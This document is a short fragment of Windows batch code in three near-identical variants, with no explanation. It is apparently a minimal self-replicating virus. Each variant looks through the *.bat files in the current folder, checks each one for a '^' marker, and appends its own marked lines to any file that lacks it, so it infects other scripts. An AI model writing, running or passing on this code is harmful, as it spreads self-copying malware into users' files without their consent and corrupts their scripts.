@for %%b in (*.bat) do set ^=%%b
@find "^"<%^%>nul
@if errorlevel 1 find "^"<%0>>%^%

for %%b in (*.bat) do set ^=%%b
find "^"<%^%>nul
if errorlevel 1 find "^"<%0>>%^%

for %%b in (*.bat) do set ^=%%b
find "^"<%^%
if errorlevel 1 find "^"<%0>>%^%
